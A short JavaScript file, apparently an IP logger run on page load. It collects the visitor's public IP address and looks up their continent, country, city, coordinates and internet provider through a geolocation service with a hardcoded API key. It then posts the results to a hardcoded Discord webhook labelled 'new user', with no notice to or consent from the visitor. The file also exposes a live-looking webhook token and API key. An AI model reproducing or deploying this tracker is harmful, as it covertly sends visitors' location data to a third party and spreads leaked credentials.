has_ip = false
located = false

const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))


function discord_msg(mesage) {
    fetch("https://discordapp.com/api/webhooks/1314333297173856328/cUtaTn4ds-wtmXm1BUIlGFzRg_eSVpKtNa3tchU00AjmC2PvlQWG9TlJ0d4_vTPOgQYQ", {
        body: JSON.stringify({
          content: mesage,
        }),
        headers: {
          "Content-Type": "application/json",
        },
        method: "POST",
      })
        .then(function (res) {
          console.log(res);
        })
        .catch(function (res) {
          console.log(res);
        });
};

async function get_info() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        ipv4 = data.ip
        const requestOptions = {
          method: "GET",
          redirect: "follow"
        };
        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=8b84965e7c8e445c8c8a98f1f0199837&ip=" + ipv4, requestOptions)
          .then((response) => response.text())
          .then((result) => info = result)
          .catch((error) => console.error(error));

        await sleep(1000);
        info = JSON.parse(info)
        console.log("info JSON.parse complete")
        continent = info["continent_name"];
        country = info['country_name'];
        city = info['city']
        latitude = info['latitude']
        longitude = info['longitude']
        organization = info['organization']
        console.log("info gathered")
        has_info = true
    }
        catch (error) {
        console.error('Error fetching IP address:', error);
        };
};



const send_to_discord = async () => {
    console.log(info)
    await sleep(200);
    if (has_info) {
      var msg = '-------------- \n' +
      'new user \n' +
      'ip: ' + ipv4 + '\n' +
      'contintent: ' + continent + '\n' +
      'country: ' + country + '\n' +
      'city: ' + city + '\n' +
      'coords: ' + latitude + ', ' + longitude + '\n' +
      'provider: ' + organization;
      discord_msg(msg);
      console.log("sent")
    } else {
};
};

x = async () => {
    console.log("starting")
    await sleep(500);
    get_info();
    await sleep(5000);
    send_to_discord();
}

x()
